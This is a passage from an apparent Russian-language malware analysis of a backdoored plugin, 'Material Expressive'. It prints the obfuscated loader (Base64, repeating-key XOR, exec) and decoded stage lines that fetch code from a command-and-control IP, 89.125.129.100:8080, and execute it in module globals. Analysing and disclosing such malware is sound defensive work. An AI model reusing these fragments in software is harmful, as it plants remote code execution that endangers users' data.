## Д2. Как именно работает бэкдор

**Утверждение:** встроенный этап скачивает и исполняет удалённый Python.

Строки **683–686 исходного Material Expressive**, пробелы нормализованы:

```python
_raw = _b64.b64decode(_ld)
_k = bytes.fromhex("5a2e91c7")
_dec = bytes(c ^ _k[i % len(_k)] for i, c in enumerate(_raw))
exec(compile(_dec.decode("utf-8"), "<x>", "exec"), globals())
```

Открытый текст получен как Base64 → XOR с повторяющимся ключом
`5a 2e 91 c7`, без вызова `exec`. Его размер — **1 753 байта**,
SHA-256 точного, немаскированного результата:

```text
db3fc3be41be57f00e81185e5063add467a4f188aa3e18748664af8227b7ce6a
```

Строки **5–7 восстановленного этапа**:

```python
_FB   = '89.125.129.100'
_PORT = 8080
P     = '/api/v1/rt'
```

Строки **39–42**:

```python
q=u.Request(C2C+P,headers={"X-Client-Id":i,"X-Plugin-Token":T})
r2=u.urlopen(q,timeout=15).read()
try: r2=b.b64decode(r2)
except: pass
```

Строка **48**:

```python
exec(compile(r2.decode("utf-8","ignore"),"<x>","exec"),g)
```

`g` присваивается `globals()` на строке 43. Следовательно, результат сервера
исполняется в глобальном контексте модуля. В этом пути не показаны подпись
скачанного кода или запрос подтверждения у пользователя.

**Приложения:** [исходный фрагмент с номерами строк](plugin_loader.source_excerpt.txt),
[восстановленный этап с номерами строк](loader.redacted.numbered.txt).
Токен в приложенной копии заменён на `REDACTED`, поэтому её хэш отличается
от указанного выше хэша точного результата. Длинный Base64-блок в выдержке
исходника опущен и обозначен явно.

**Предел вывода:** `89.125.129.100` — fallback. Основной IP берётся из внешних
источников, поэтому факт соединения устройства именно с этим IP не установлен.
Код плагина не исполнялся, запросов к C2 не выполнялось, содержимое серверной
нагрузки неизвестно. Произвольный удалённый код даёт риск доступа к данным
в пределах прав приложения, но сам по себе не доказывает кражу конкретной сессии.
